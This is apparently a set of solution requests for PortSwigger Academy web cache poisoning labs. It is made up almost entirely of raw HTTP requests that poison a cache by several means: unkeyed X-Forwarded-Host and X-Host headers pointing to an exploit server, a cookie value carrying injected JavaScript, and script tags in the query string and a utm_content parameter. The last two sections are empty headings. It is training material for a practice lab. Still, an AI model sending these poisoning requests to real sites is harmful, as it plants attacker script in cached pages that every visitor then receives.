## 1. Web cache poisoning with an unkeyed header

```
GET / HTTP/2
Host: 0a32002403099e5e8044eed300e4007d.web-security-academy.net
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
X-Forwarded-Host: exploit-0afa007403ef9e4f8054edbd01bb00c0.exploit-server.net


```


## 2. Web cache poisoning with an unkeyed cookie

```
GET / HTTP/2
Host: 0a8b00820328492c8071f869009f004d.web-security-academy.net
Cookie: session=xFfkHbkyh7eNDCOUXHhSIzMhSnMfTcrI; fehost=someString"-alert(1)-"someString
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


```


## 3. Web cache poisoning with multiple headers

```
GET /resources/js/tracking.js HTTP/2
Host: 0a5600e004e1a08385156c4d00c0006d.web-security-academy.net
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0a5600e004e1a08385156c4d00c0006d.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
X-Forwarded-Host: exploit-0a4700510475a0fe85d06bae014600ea.exploit-server.net
X-Forwarded-Scheme: nohttps


```


## 4. Targeted web cache poisoning using an unknown header

XSS

```
<img src="https://exploit-0a75001f03a6c4e780eb07db015700fd.exploit-server.net/foo" />
```

Poisoning

```
GET / HTTP/1.1
Host: 0a08001b032bc4d980b3081a00fd00b9.h1-web-security-academy.net
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="116", "Chromium";v="116"
Sec-Ch-Ua-Platform: Windows
Sec-Ch-Ua-Mobile: ?0
X-Host: exploit-0a75001f03a6c4e780eb07db015700fd.exploit-server.net


```


## 5. Web cache poisoning via an unkeyed query string

```
GET /?evil='/><script>alert(1)</script> HTTP/1.1
Host: 0a46000a03ee806e82182e9e00a30011.web-security-academy.net
Accept-Encoding: gzip, deflate, gc31d0npsy
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7, text/gc31d0npsy
Accept-Language: en-US,gc31d0npsy;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36 gc31d0npsy
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="116", "Chromium";v="116"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0


```


## 6. Web cache poisoning via an unkeyed query parameter

```
GET /?utm_content=25awzp64et'/><script>alert(1)</script> HTTP/1.1
Host: 0a4300d7030cd8938203cfc100c4007f.web-security-academy.net
Accept-Encoding: gzip, deflate, lwkhe2fbn1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7, text/lwkhe2fbn1
Accept-Language: en-US,lwkhe2fbn1;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36 lwkhe2fbn1
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="116", "Chromium";v="116"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Origin: https://lwkhe2fbn1.0a4300d7030cd8938203cfc100c4007f.web-security-academy.net


```


## 7. Parameter cloaking

```

```


## 8. 

```

```
